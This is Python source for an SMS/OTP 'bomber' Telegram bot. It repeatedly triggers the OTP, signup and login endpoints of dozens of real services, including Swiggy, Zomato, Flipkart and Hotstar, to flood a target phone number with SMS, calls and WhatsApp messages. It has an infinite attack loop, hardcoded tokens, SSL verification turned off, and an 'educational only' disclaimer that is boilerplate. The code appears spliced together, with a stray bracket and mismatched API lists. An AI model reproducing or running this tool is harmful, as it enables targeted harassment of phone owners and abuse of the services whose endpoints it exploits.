            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile': phone, 'submit': '1'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_apollo(phone, cc):
        """Apollo Pharmacy - from BRO_BOM.py"""
        try:
            url = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile': phone}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return "sent" in r.text.lower() or r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_grab(phone, cc):
        """Grab - from BRO_BOM.py"""
        try:
            url = "https://api.grab.com/grabid/v1/phone/otp"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'method': 'SMS', 'countryCode': 'id', 'phoneNumber': f'{cc}{phone}', 'templateID': 'pax_android_production'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_gokwik(phone, cc):
        """GoKwik - from BOMBER.py"""
        try:
            url = "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0', 'gk-merchant-id': '19g6im8srkz9y'}
            data = {"phone": phone, "country": "IN"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_khatabook(phone, cc):
        """Khatabook - from BRO_BOM.py"""
        try:
            url = "https://api.khatabook.com/v1/auth/request-otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0', 'x-kb-platform': 'web'}
            data = {"country_code": f"+{cc}", "phone": phone, "app_signature": "Jc/Zu7qNqQ2"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_udaan(phone, cc):
        """Udaan - from BOMBER.py"""
        try:
            url = "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile': phone}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_penpencil(phone, cc):
        """PenPencil - from BRO_BOM.py"""
        try:
            url = "https://api.penpencil.co/v1/users/resend-otp?smsType=2"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile": phone, "organizationId": "5eb393ee95fab7468a79d189"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_vidyakul(phone, cc):
        """Vidyakul - from BOMBER.py"""
        try:
            url = "https://vidyakul.com/signup-otp/send"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'phone': phone, 'rcsconsent': 'true'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_jockey(phone, cc):
        """Jockey - from BOMBER.py"""
        try:
            url = f"https://www.jockey.in/apps/jotp/api/login/send-otp/+{cc}{phone}?whatsapp=true"
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_pinknblu(phone, cc):
        """Pinknblu - from BOMBER.py"""
        try:
            url = "https://pinknblu.com/v1/auth/generate/otp"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'_token': 'fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb', 'country_code': f'+{cc}', 'phone': phone}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_breeze(phone, cc):
        """Breeze - from BOMBER.py"""
        try:
            url = "https://api.breeze.in/session/start"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"phoneNumber": phone, "authVerificationType": "otp", "countryCode": f"+{cc}"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_heromoto(phone, cc):
        """Hero MotoCorp - from SMS-BOMBER.py"""
        try:
            url = "https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile_no': phone, 'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis='}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_indialends(phone, cc):
        """IndiaLends - from SMS-BOMBER.py"""
        try:
            url = "https://indialends.com/internal/a/mobile-verification_v2.ashx"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'aeyder03teaeare': '1', 'ertysvfj74sje': cc, 'jfsdfu14hkgertd': phone, 'lj80gertdfg': '0'}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_delhivery(phone, cc):
        """Delhivery - from bombervk.py"""
        try:
            url = f"https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}"
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_confirmtkt(phone, cc):
        """ConfirmTkt - from bombervk.py"""
        try:
            url = f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={phone}"
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_udaan_alt(phone, cc):
        """Udaan Alt - from BOMBER.py"""
        try:
            url = "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true"
            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
            data = {'mobile': phone}
            r = requests.post(url, headers=headers, data=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_nuvama(phone, cc):
        """Nuvama Wealth - from BOMBER.py"""
        try:
            url = "https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"contactInfo": phone, "mode": "SMS"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_aditya(phone, cc):
        """Aditya Birla - from BOMBER.py"""
        try:
            url = "https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {'request': 'CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw=='}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_kisan(phone, cc):
        """Kisan - from BOMBER.py"""
        try:
            url = "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile_number": phone, "client_id": "kisan-app"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_swiggy(phone, cc):
        """Swiggy - from SMS-BOMBER.py"""
        try:
            url = "https://www.swiggy.com/mapi/auth/signup"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"name": "User", "email": "user@gmail.com", "password": "Pass@123", "mobile": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_zomato(phone, cc):
        """Zomato - from SMS-BOMBER.py"""
        try:
            url = "https://www.zomato.com/webroutes/auth/login"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"country_id": 1, "phone": phone, "verification_type": "sms", "method": "phone"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_bigbasket(phone, cc):
        """BigBasket - from SMS-BOMBER.py"""
        try:
            url = "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"identifier": phone}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_bookmyshow(phone, cc):
        """BookMyShow - from SMS-BOMBER.py"""
        try:
            url = "https://in.bookmyshow.com/pwa/api/uapi/otp/send"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"channel": "phone", "subChannel": "sms", "details": {"phone": phone, "origin": "https://in.bookmyshow.com"}}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_dream11(phone, cc):
        """Dream11 - from SMS-BOMBER.py"""
        try:
            url = "https://www.dream11.com/graphql/mutation/pwa/register"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"query": "mutation register($email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation(email: $email mobileNumber: $mobileNumber password: $password site: $site) { message }}", "variables": {"email": "user@gmail.com", "mobileNumber": phone, "password": "Pass@123"}}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_sonyliv(phone, cc):
        """SonyLiv - from SMS-BOMBER.py"""
        try:
            url = "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobileNumber": phone, "channelPartnerID": "MSMIND", "country": "IN", "timestamp": datetime.datetime.now().isoformat()}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_hotstar(phone, cc):
        """Hotstar - from SMS-BOMBER.py"""
        try:
            url = "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"phone_number": phone, "country_prefix": cc}
            r = requests.put(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_voot(phone, cc):
        """Voot - from SMS-BOMBER.py"""
        try:
            url = "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"type": "mobile", "mobile": phone, "countryCode": f"+{cc}"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_bikroy(phone, cc):
        """Bikroy - from BOMBING.py"""
        try:
            url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}"
            headers = {'User-Agent': 'Mozilla/5.0', 'application-name': 'web'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_garibook(phone, cc):
        """Garibook - from BOMBING.py"""
        try:
            url = "https://api.garibookadmin.com/api/v3/user/login"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile": phone, "recaptcha_token": "garibookcaptcha", "channel": "web"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_sheba(phone, cc):
        """Sheba - from BOMBING.py"""
        try:
            url = "https://accountkit.sheba.xyz/api/shooot-otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile": f"+{cc}{phone}", "app_id": "8329815A6D1AE6DD"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_applink(phone, cc):
        """Osudpotro - from BOMBING.py"""
        try:
            url = "https://api.osudpotro.com/api/v1/users/send_otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"mobile": f"+{cc}{phone}", "deviceToken": "web", "language": "en", "os": "web"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_medeasy(phone, cc):
        """MedEasy - from BOMBING.py"""
        try:
            url = f"https://api.medeasy.health/api/send-otp/+{cc}{phone}/"
            headers = {'User-Agent': 'Mozilla/5.0'}
            r = requests.get(url, headers=headers, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False
    
    @staticmethod
    def send_carebox(phone, cc):
        """Care Box - from BOMBING.py"""
        try:
            url = "https://www.api-care-box.click/api/user/register/"
            headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            data = {"Name": "User", "Phone": f"+{cc}{phone}"}
            r = requests.post(url, headers=headers, json=data, timeout=8)
            return r.status_code in [200, 201, 202]
        except:
            return False

# ==============================================
# 📋 COMPLETE API LIST - ALL MERGED
# ==============================================
ALL_APIS = [
    {"name": "OYO Rooms", "func": APIManager.send_oyo},
    {"name": "Flipkart", "func": APIManager.send_flipkart},
    {"name": "PharmEasy", "func": APIManager.send_pharmeasy},
    {"name": "Practo", "func": APIManager.send_practo},
    {"name": "GoIbibo", "func": APIManager.send_goibibo},
    {"name": "PizzaHut", "func": APIManager.send_pizzahut},
    {"name": "AltBalaji", "func": APIManager.send_altbalaji},
    {"name": "Ajio", "func": APIManager.send_ajio},
    {"name": "Lenskart", "func": APIManager.send_lenskart},
    {"name": "Apollo", "func": APIManager.send_apollo},
    {"name": "Grab", "func": APIManager.send_grab},
    {"name": "GoKwik", "func": APIManager.send_gokwik},
    {"name": "Khatabook", "func": APIManager.send_khatabook},
    {"name": "Udaan", "func": APIManager.send_udaan},
    {"name": "PenPencil", "func": APIManager.send_penpencil},
    {"name": "Vidyakul", "func": APIManager.send_vidyakul},
    {"name": "Jockey", "func": APIManager.send_jockey},
    {"name": "Pinknblu", "func": APIManager.send_pinknblu},
    {"name": "Breeze", "func": APIManager.send_breeze},
    {"name": "HeroMoto", "func": APIManager.send_heromoto},
    {"name": "IndiaLends", "func": APIManager.send_indialends},
    {"name": "Delhivery", "func": APIManager.send_delhivery},
    {"name": "ConfirmTkt", "func": APIManager.send_confirmtkt},
    {"name": "Nuvama", "func": APIManager.send_nuvama},
    {"name": "AdityaBirla", "func": APIManager.send_aditya},
    {"name": "Kisan", "func": APIManager.send_kisan},
    {"name": "Swiggy", "func": APIManager.send_swiggy},
    {"name": "Zomato", "func": APIManager.send_zomato},
    {"name": "BigBasket", "func": APIManager.send_bigbasket},
    {"name": "BookMyShow", "func": APIManager.send_bookmyshow},
    {"name": "Dream11", "func": APIManager.send_dream11},
    {"name": "SonyLiv", "func": APIManager.send_sonyliv},
    {"name": "Hotstar", "func": APIManager.send_hotstar},
    {"name": "Voot", "func": APIManager.send_voot},
    {"name": "Bikroy", "func": APIManager.send_bikroy},
    {"name": "Garibook", "func": APIManager.send_garibook},
    {"name": "Sheba", "func": APIManager.send_sheba},
    {"name": "AppLink", "func": APIManager.send_applink},
    {"name": "Arogga", "func": APIManager.send_arogga},
    {"name": "Osudpotro", "func": APIManager.send_osudpotro},
    {"name": "MedEasy", "func": APIManager.send_medeasy},
    {"name": "CareBox", "func": APIManager.send_carebox},
]

# ==============================================
# 💾 DATA MANAGEMENT
# ==============================================
def load_protected():
    if not os.path.exists(PROTECTED_FILE):
        return {}
    try:
        with open(PROTECTED_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_protected(data):
    with open(PROTECTED_FILE, "w") as f:
        json.dump(data, f, indent=4)

def load_config():
    if not os.path.exists(CONFIG_FILE):
        save_config(DEFAULT_CONFIG)
        return DEFAULT_CONFIG
    try:
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    except:
        return DEFAULT_CONFIG

def save_config(data):
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=4)

def log_attack(phone, count, success):
    try:
        with open(ATTACK_LOG, "a") as f:
            f.write(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {phone} | {count} | {success}\n")
    except:
        pass

def encrypt_number(phone):
    return base64.b64encode(phone.encode()).decode()

def is_protected(phone):
    data = load_protected()
    return phone in data

def protect_number(phone, name="Protected"):
    data = load_protected()
    data[phone] = {
        "phone": phone,
        "name": name,
        "encrypted": encrypt_number(phone),
        "date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_protected(data)
    return True

def remove_protected(phone):
    data = load_protected()
    if phone in data:
        del data[phone]
        save_protected(data)
        return True
    return False

def show_protected():
    data = load_protected()
    if not data:
        return "📭 No protected numbers found."
    result = f"\n📘 Total Protected: {len(data)}\n{'─'*50}\n"
    for phone, info in data.items():
        result += f"  📱 {phone} - {info.get('name', 'Unknown')}\n"
    return result
]

async def hit_api(session, api, phone, stats):
    """Hit a single API endpoint"""
    try:
        # Get URL and data
        url = api["url"]
        data = api["data"](phone) if api["data"] else None
        
        # Handle callable URLs
        if callable(url):
            url = url(phone)
        
        # Make request
        async with session.request(
            method=api["method"],
            url=url,
            headers=api["headers"],
            data=data,
            timeout=aiohttp.ClientTimeout(total=5),
            ssl=False  # Bypass SSL verification for better success rate
        ) as response:
            status = response.status
            if status in [200, 201, 202, 204]:
                api_type = api.get("type", "SMS")
                stats[api_type] = stats.get(api_type, 0) + 1
                return True
    except Exception as e:
        logger.debug(f"API {api.get('name', 'Unknown')} failed: {str(e)}")
    return False

async def animate_message(chat_id, message_id, text_prefix="", frames=None):
    """Animate a message with loading frames"""
    if frames is None:
        frames = ANIMATION_FRAMES
    
    for frame in frames:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"{frame} {text_prefix}"
            )
            await asyncio.sleep(0.5)
        except:
            break

def create_main_keyboard():
    """Create main reply keyboard"""
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🚀 Start Infinite Boom"))
    builder.row(types.KeyboardButton(text="📊 Check Stats"))
    builder.row(types.KeyboardButton(text="ℹ️ Help"))
    builder.row(types.KeyboardButton(text="👨‍💻 Developer"))
    return builder.as_markup(resize_keyboard=True)

def create_stop_keyboard():
    """Create stop attack keyboard"""
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🛑 STOP ATTACK"))
    builder.row(types.KeyboardButton(text="📊 Live Stats"))
    builder.row(types.KeyboardButton(text="🏠 Main Menu"))
    return builder.as_markup(resize_keyboard=True)

def create_stats_inline_keyboard():
    """Create inline keyboard for stats"""
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="🔄 Refresh Stats", callback_data="refresh_stats"),
        InlineKeyboardButton(text="📈 All Time Stats", callback_data="alltime_stats")
    )
    builder.row(
        InlineKeyboardButton(text="⚡ Fast Attack", callback_data="fast_attack"),
        InlineKeyboardButton(text="🐢 Slow Attack", callback_data="slow_attack")
    )
    return builder.as_markup()

@dp.message(CommandStart())
async def start_command(message: types.Message):
    """Handle /start command"""
    welcome_text = f"""
🎯 <b>CLOUD LEAKED BOMBER BOT</b> 🎯

<b>Developer:</b> {DEVELOPER_ID}
<b>Active APIs:</b> {len(ULTIMATE_APIS)}
<b>Types:</b> Calls, SMS, WhatsApp

📌 <b>Commands:</b>
• Send 10-digit number to start attack
• Use buttons below for control

🔥 <b>Features:</b>
• Multiple API endpoints
• Real-time stats
• Attack control
• Live animations
• Fast & Slow modes

⚠️ <b>Warning:</b> Use responsibly!
    """
    
    await message.answer(
        welcome_text,
        reply_markup=create_main_keyboard(),
        parse_mode="HTML"
    )

@dp.message(F.text == "ℹ️ Help")
async def help_command(message: types.Message):
    """Show help information"""
    help_text = f"""
🆘 <b>HELP & GUIDE</b> 🆘

<b>How to use:</b>
1. Click <b>'🚀 Start Infinite Boom'</b>
2. Send <b>10-digit phone number</b> (without +91)
3. Attack will start automatically
4. Use <b>'🛑 STOP ATTACK'</b> to stop

<b>Available Commands:</b>
• /start - Start bot
• /stats - Show statistics
• /stop - Stop current attack
• /help - This message

<b>Attack Types:</b>
• Calls 📞 - Voice call OTPs
• SMS 📩 - Text message OTPs
• WhatsApp 💬 - WhatsApp messages

<b>Developer:</b> {DEVELOPER_ID}
<b>Support:</b> Contact developer for issues

⚠️ <b>Legal Notice:</b>
This bot is for educational purposes only.
Misuse may lead to legal consequences.
    """
    
    await message.answer(help_text, parse_mode="HTML")

@dp.message(F.text == "👨‍💻 Developer")
async def developer_info(message: types.Message):
    """Show developer information"""
    dev_text = f"""
👨‍💻 <b>DEVELOPER INFORMATION</b>

<b>Developer:</b> {DEVELOPER_ID}
<b>Bot Version:</b> 2.0
<b>Last Updated:</b> {time.strftime('%Y-%m-%d')}

🔧 <b>Technical Details:</b>
• Built with Python & aiogram
• Async requests for speed
• Multi-API support
• Real-time monitoring

📞 <b>Contact:</b>
Telegram: {DEVELOPER_ID}
For support and feature requests

🚀 <b>Features Coming Soon:</b>
• More API endpoints
• Custom attack patterns
• Scheduled attacks
• Advanced analytics

⭐ <b>Please rate and review!</b>
    """
    
    await message.answer(dev_text, parse_mode="HTML")

@dp.message(F.text == "📊 Check Stats")
async def check_stats(message: types.Message):
    """Show current statistics"""
    user_id = message.from_user.id
    stats = attack_stats.get(user_id, {})
    
    if not stats:
        stats_text = "📊 <b>No attack statistics available yet.</b>\nStart an attack to see stats!"
    else:
        calls = stats.get('Call', 0)
        sms = stats.get('SMS', 0)
        whatsapp = stats.get('WhatsApp', 0)
        total = calls + sms + whatsapp
        
        stats_text = f"""
📊 <b>ATTACK STATISTICS</b>

<b>Total Hits:</b> {total}
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}

<b>Success Rate:</b> {(total / (len(ULTIMATE_APIS) * (stats.get('cycles', 1))) * 100):.1f}%
<b>Active APIs:</b> {len(ULTIMATE_APIS)}
<b>Last Updated:</b> Just now
        """
    
    await message.answer(
        stats_text,
        reply_markup=create_stats_inline_keyboard(),
        parse_mode="HTML"
    )

@dp.message(F.text == "🚀 Start Infinite Boom")
async def start_attack_prompt(message: types.Message):
    """Prompt for phone number"""
    await message.answer(
        "📱 <b>Enter target phone number (10 digits):</b>\n\n"
        "Example: <code>9876543210</code>\n\n"
        "⚠️ Make sure it's 10 digits without +91",
        parse_mode="HTML"
    )

@dp.message(F.text == "🛑 STOP ATTACK")
async def stop_attack(message: types.Message):
    """Stop current attack"""
    user_id = message.from_user.id
    
    if user_id in stop_signals:
        stop_signals[user_id] = True
        await message.answer(
            "🛑 <b>Attack stopping...</b>\n"
            "Current cycle will complete and then stop.",
            reply_markup=create_main_keyboard()
        )
        
        # Clear attack state after delay
        await asyncio.sleep(2)
        if user_id in user_attacks:
            del user_attacks[user_id]
    else:
        await message.answer(
            "ℹ️ <b>No active attack to stop.</b>\n"
            "Start an attack first.",
            reply_markup=create_main_keyboard()
        )

@dp.message(F.text == "📊 Live Stats")
async def live_stats(message: types.Message):
    """Show live attack statistics"""
    user_id = message.from_user.id
    
    if user_id in attack_stats:
        stats = attack_stats[user_id]
        calls = stats.get('Call', 0)
        sms = stats.get('SMS', 0)
        whatsapp = stats.get('WhatsApp', 0)
        total = calls + sms + whatsapp
        
        live_text = f"""
📊 <b>LIVE ATTACK STATISTICS</b>

<b>Total Hits:</b> {total}
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}

<b>Status:</b> {'⚡ ACTIVE' if user_id in user_attacks else '⏸️ PAUSED'}
<b>Last Hit:</b> {stats.get('last_update', 'N/A')}
        """
    else:
        live_text = "ℹ️ <b>No active attack.</b> Start an attack to see live stats."
    
    await message.answer(live_text, parse_mode="HTML")

@dp.message(F.text == "🏠 Main Menu")
async def main_menu(message: types.Message):
    """Return to main menu"""
    await message.answer(
        "🏠 <b>Main Menu</b>\nSelect an option:",
        reply_markup=create_main_keyboard(),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "refresh_stats")
async def refresh_stats_callback(callback: types.CallbackQuery):
    """Refresh statistics"""
    user_id = callback.from_user.id
    stats = attack_stats.get(user_id, {})
    
    calls = stats.get('Call', 0)
    sms = stats.get('SMS', 0)
    whatsapp = stats.get('WhatsApp', 0)
    total = calls + sms + whatsapp
    
    stats_text = f"""
🔄 <b>STATISTICS REFRESHED</b>

<b>Total Hits:</b> {total}
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}

<b>Updated:</b> {time.strftime('%H:%M:%S')}
    """
    
    await callback.message.edit_text(
        stats_text,
        reply_markup=create_stats_inline_keyboard(),
        parse_mode="HTML"
    )
    await callback.answer("✅ Statistics refreshed!")

@dp.callback_query(F.data == "alltime_stats")
async def alltime_stats_callback(callback: types.CallbackQuery):
    """Show all-time statistics"""
    # This would track all attacks, for now show current
    await callback.answer("📈 All-time stats feature coming soon!")

@dp.callback_query(F.data == "fast_attack")
async def fast_attack_callback(callback: types.CallbackQuery):
    """Switch to fast attack mode"""
    user_id = callback.from_user.id
    if user_id in user_attacks:
        user_attacks[user_id]['delay'] = 2  # 2 seconds delay
        await callback.answer("⚡ Fast mode activated (2s delay)")
    else:
        await callback.answer("Start an attack first!")

@dp.callback_query(F.data == "slow_attack")
async def slow_attack_callback(callback: types.CallbackQuery):
    """Switch to slow attack mode"""
    user_id = callback.from_user.id
    if user_id in user_attacks:
        user_attacks[user_id]['delay'] = 10  # 10 seconds delay
        await callback.answer("🐢 Slow mode activated (10s delay)")
    else:
        await callback.answer("Start an attack first!")

@dp.message(F.text.regexp(r'^\d{10}$'))
async def handle_phone_number(message: types.Message):
    """Handle phone number input and start attack"""
    user_id = message.from_user.id
    phone = message.text
    
    # Validate phone number
    if not phone.startswith(('6', '7', '8', '9')):
        await message.answer(
            "❌ <b>Invalid phone number!</b>\n"
            "Indian numbers start with 6,7,8, or 9.\n"
            "Please enter a valid 10-digit number.",
            parse_mode="HTML"
        )
        return
    
    # Initialize attack
    stop_signals[user_id] = False
    user_attacks[user_id] = {
        'phone': phone,
        'start_time': time.time(),
        'delay': 5,  # Default delay
        'cycles': 0
    }
    attack_stats[user_id] = {
        'Call': 0,
        'SMS': 0,
        'WhatsApp': 0,
        'cycles': 0,
        'last_update': time.strftime('%H:%M:%S')
    }
    
    # Send starting animation
    start_msg = await message.answer(
        "🎯 <b>INITIALIZING ATTACK...</b>\n\n"
        f"<b>Target:</b> <code>{phone}</code>\n"
        f"<b>APIs Loaded:</b> {len(ULTIMATE_APIS)}\n"
        f"<b>Mode:</b> INFINITE\n\n"
        "⚡ Preparing to fire...",
        parse_mode="HTML",
        reply_markup=create_stop_keyboard()
    )
    
    # Run animation
    await animate_message(message.chat.id, start_msg.message_id, f"Target: {phone}")
    
    # Start attack in background
    asyncio.create_task(run_attack(user_id, phone, message.chat.id, start_msg.message_id))
    
    # Update with initial status
    await bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=start_msg.message_id,
        text=f"🚀 <b>ATTACK STARTED!</b>\n\n"
             f"<b>Target:</b> <code>{phone}</code>\n"
             f"<b>Status:</b> Firing APIs...\n"
             f"<b>Hits:</b> 0\n"
             f"<b>Next cycle:</b> 5s",
        parse_mode="HTML",
        reply_markup=create_stop_keyboard()
    )

async def run_attack(user_id, phone, chat_id, message_id):
    """Run the attack loop"""
    stats = attack_stats[user_id]
    attack_info = user_attacks[user_id]
    delay = attack_info['delay']
    
    async with aiohttp.ClientSession() as session:
        cycle_count = 0
        
        while not stop_signals.get(user_id, False):
            try:
                cycle_count += 1
                attack_info['cycles'] = cycle_count
                stats['cycles'] = cycle_count
                
                # Fire all APIs
                tasks = [hit_api(session, api, phone, stats) for api in ULTIMATE_APIS]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Calculate hits
                calls = stats.get('Call', 0)
                sms = stats.get('SMS', 0)
                whatsapp = stats.get('WhatsApp', 0)
                total = calls + sms + whatsapp
                
                # Update message
                stats['last_update'] = time.strftime('%H:%M:%S')
                
                # Update status message
                status_text = f"""
🎯 <b>ACTIVE ATTACK - CYCLE {cycle_count}</b>

<b>Target:</b> <code>{phone}</code>
<b>Status:</b> ⚡ RUNNING
<b>Delay:</b> {delay}s

📊 <b>STATISTICS:</b>
<b>📞 Calls:</b> {calls}
<b>📩 SMS:</b> {sms}
<b>💬 WhatsApp:</b> {whatsapp}
<b>🔥 Total Hits:</b> {total}

<b>Next cycle in:</b> {delay}s
<b>Last Update:</b> {stats['last_update']}
                """
                
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id,
